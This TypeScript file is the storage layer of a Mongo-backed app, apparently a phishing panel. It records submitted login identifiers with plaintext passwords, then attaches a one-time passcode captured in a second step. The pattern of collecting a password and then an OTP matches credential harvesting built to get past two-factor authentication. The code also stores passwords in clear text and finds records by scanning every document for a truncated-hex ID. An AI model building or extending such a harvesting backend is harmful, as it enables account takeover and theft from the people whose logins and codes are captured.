import type { Submission, InsertSubmission } from "@shared/schema";
import { SubmissionModel } from "./mongodb";

export interface IStorage {
  createSubmission(submission: Omit<InsertSubmission, 'otp'>): Promise<Submission>;
  updateSubmissionOtp(id: number, otp: string): Promise<Submission>;
  getSubmission(id: number): Promise<Submission | undefined>;
}

export class MongoStorage implements IStorage {
  async createSubmission(submission: Omit<InsertSubmission, 'otp'>): Promise<Submission> {
    const doc = await SubmissionModel.create({
      ...submission,
      otp: null
    });
    
    return {
      id: parseInt(doc._id.toString().slice(-8), 16),
      loginMethod: doc.loginMethod as 'phone' | 'email' | 'username',
      identifier: doc.identifier,
      password: doc.password,
      otp: doc.otp || null,
      submittedAt: doc.createdAt || new Date()
    };
  }

  async updateSubmissionOtp(id: number, otp: string): Promise<Submission> {
    const docs = await SubmissionModel.find().sort({ _id: -1 });
    const doc = docs.find(d => parseInt(d._id.toString().slice(-8), 16) === id);
    
    if (!doc) {
      throw new Error('Submission not found');
    }

    doc.otp = otp;
    await doc.save();

    return {
      id: parseInt(doc._id.toString().slice(-8), 16),
      loginMethod: doc.loginMethod as 'phone' | 'email' | 'username',
      identifier: doc.identifier,
      password: doc.password,
      otp: doc.otp,
      submittedAt: doc.createdAt || new Date()
    };
  }

  async getSubmission(id: number): Promise<Submission | undefined> {
    const docs = await SubmissionModel.find().sort({ _id: -1 });
    const doc = docs.find(d => parseInt(d._id.toString().slice(-8), 16) === id);
    
    if (!doc) {
      return undefined;
    }

    return {
      id: parseInt(doc._id.toString().slice(-8), 16),
      loginMethod: doc.loginMethod as 'phone' | 'email' | 'username',
      identifier: doc.identifier,
      password: doc.password,
      otp: doc.otp || null,
      submittedAt: doc.createdAt || new Date()
    };
  }
}

export const mongoStorage = new MongoStorage();
